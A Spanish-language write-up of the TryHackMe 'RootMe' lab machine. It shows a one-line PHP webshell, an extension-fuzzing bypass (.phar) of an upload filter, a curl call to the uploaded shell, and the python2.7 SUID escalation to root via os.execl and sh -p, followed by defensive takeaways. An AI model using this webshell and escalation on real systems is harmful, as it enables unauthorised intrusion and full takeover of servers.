RootMe es una máquina Linux Easy de TryHackMe que junta los dos hallazgos de principiante más comunes en una sola cadena limpia. Un panel de subida de ficheros bloquea la extensión `.php` pero no las *otras* extensiones que Apache sigue entregando al intérprete de PHP, así que un webshell subido como `.phar` se ejecuta y da una shell como `www-data`. Desde ahí, un único binario con SUID —`python2.7`— es un salto de manual de GTFOBins directo a root.

### Enumeración Web — El Panel de Subida

`/panel/` es un formulario de subida de ficheros, y `/uploads/` es donde aterrizan los ficheros enviados — con el **listado de directorios habilitado**, así que cualquier cosa aceptada es alcanzable en una URL predecible. Ese par es toda la superficie de ataque: un sitio donde escribir un fichero, y un sitio donde alcanzarlo y ejecutarlo. Wappalyzer confirma que el stack es PHP, lo que decide qué tipo de fichero merece subir — un webshell PHP que ejecuta un comando desde un parámetro de la query string:

```php
<?php system($_GET['cmd']); ?>
```

## Acceso Inicial — Subida Sin Restricción (bypass con `.phar`) como `www-data`

Subir `shell.php` por el panel es rechazado — hay un filtro de extensión—, así que la petición pasa por Burp Suite para verla y manipularla:

![Burp Suite mostrando la subida de shell.php rechazada por el filtro de extensión del panel](/assets/img/THM/RootMe/cap1.png)

La clave es que Apache decide si *ejecuta* un fichero por su extensión, y `mod_php` suele estar registrado para varias de ellas, no solo `.php` — `.phtml`, `.php3`/`.php4`/`.php5`/`.php7`, `.pht` y `.phar` entre otras. Un filtro de subida que solo prohíbe `.php` deja esas alternativas abiertas, así que el movimiento es fuzzear la extensión en Burp hasta que una sea a la vez *aceptada por el filtro* y *ejecutada por Apache*:

```text
.phtml  .php3  .php4  .php5  .php7  .phps  .php-s  .pht  .phar
```

![Burp Suite Repeater probando las extensiones PHP alternativas; .phar es aceptada y servida como PHP](/assets/img/THM/RootMe/cap2.png)

`.phar` —el formato de archivo de PHP, que el intérprete ejecuta como cualquier script— es la que a la vez se cuela por el filtro y se ejecuta:

```bash
curl http://10.129.182.69/uploads/shell.phar?cmd=whoami
```


## Escalada de Privilegios — `www-data` → `root`

Lo primero desde cualquier shell es comprobar qué binarios llevan el bit SUID — corren con los privilegios de su propietario sin importar quién los lance. Aquí la lista es inusualmente corta, y esa única entrada es toda la escalada:

```bash
www-data@ip-10-129-182-69:/var/www$ find / -perm -4000 2>/dev/null
/usr/bin/python2.7
```

Un intérprete con SUID es tan bueno como una shell con SUID: si Python corre como root, cualquier cosa que Python lance también puede. El oneliner de GTFOBins para un `python` con SUID usa `os.execl` para reemplazar el proceso por una shell, y `sh -p` mantiene el UID efectivo elevado en vez de soltarlo:

```bash
www-data@ip-10-129-182-69:/var/www$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cat /root/root.txt
REDACTED
```

## Conclusiones Clave

- **Un filtro de subida tiene que estar de acuerdo con el servidor web sobre qué significa "PHP".** El panel bloqueaba `.php`, pero Apache seguía ejecutando `.phar` — así que ambos discrepaban, y ese hueco fue todo el foothold. El diseño seguro es una *lista blanca* de extensiones inofensivas más guardar las subidas fuera de la raíz web (o donde el servidor no las ejecute), no una lista negra persiguiendo cada alias de PHP.
- **El listado de directorios convierte una subida a ciegas en una fiable.** Poder navegar `/uploads/` significó conocer la URL del webshell en el instante en que fue aceptado — primitiva de escritura y lectura de vuelta entregadas juntas.
- **Identifica el stack antes de elegir el payload.** La cookie `PHPSESSID` y Wappalyzer decían ambos PHP; sin eso, subir un webshell PHP habría sido una apuesta. El reconocimiento reduce el payload a la única cosa que de verdad se ejecutará.
- **Un intérprete con SUID es una shell con SUID.** `python2.7` nunca debió correr con privilegios, pero con el bit SUID entrega root a cualquier cosa que ejecute. Intérpretes, editores y runtimes de lenguajes en una lista SUID (`python`, `perl`, `vim`, `find`) son banderas rojas inmediatas — nada fuera del conjunto estándar debería llevarlo.
- **`-p` es el detalle que lo hace funcionar.** Tanto `os.execl(... "sh", "-p")` como las shells detrás dependen de `-p` para *no* soltar privilegios al arrancar; sin él, la shell se reiniciaría amablemente a `www-data` y la escalada fallaría en silencio.
